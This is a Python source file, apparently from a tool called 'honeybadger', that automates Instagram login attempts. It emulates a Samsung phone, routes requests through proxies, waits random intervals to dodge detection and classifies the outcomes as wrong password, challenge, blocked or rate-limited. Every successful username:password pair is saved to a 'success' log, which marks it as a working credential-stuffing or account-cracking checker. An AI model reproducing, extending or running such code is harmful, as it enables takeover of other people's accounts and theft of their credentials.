import os
import random
import time
import logging
from instagrapi import Client
from instagrapi.exceptions import (
    LoginRequired, 
    ChallengeRequired, 
    TwoFactorRequired, 
    ClientError, 
    BadPassword,
    PleaseWaitFewMinutes,
    SentryBlock,
    FeedbackRequired
)
from src.core.session import save_session, load_session

if not os.path.exists("logs"):
    os.makedirs("logs")

logging.basicConfig(
    filename="logs/honeybadger_debug.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

def attempt_login(username, password, proxy=None):
    cl = Client()
    
    # Device Emulation
    try:
        cl.set_device({
            "app_version": "269.0.0.18.75",
            "android_version": 26,
            "android_release": "8.0.0",
            "dpi": "480dpi",
            "resolution": "1080x1920",
            "manufacturer": "Samsung",
            "device": "SM-G960F",
            "model": "Galaxy S9",
            "cpu": "samsungexynos9810",
            "version_code": "314665256"
        })
    except:
        pass

    if proxy:
        try:
            cl.set_proxy(proxy)
        except Exception:
            return "PROXY_DEAD"

    session = load_session(username)
    if session:
        try:
            cl.load_settings(session)
        except Exception:
            pass

    # Random delay
    time.sleep(random.uniform(3, 7))

    try:
        cl.login(username, password.strip())
        
        save_session(username, cl.get_settings())
        with open("logs/success.log", "a") as f:
            f.write(f"{username}:{password}\n")
        return "SUCCESS"

    except BadPassword:
        return "WRONG_PASS"

    except (TwoFactorRequired, ChallengeRequired, FeedbackRequired) as e:
        logging.warning(f"Challenge for {username}: {e}")
        return "CHALLENGE"

    except (PleaseWaitFewMinutes, SentryBlock):
        return "BLOCKED"

    except ClientError as e:
        msg = str(e).lower()
        if "rate limit" in msg or "wait a few minutes" in msg:
            return "RATELIMIT"
        return "FAIL"

    except Exception:
        return "FAIL"
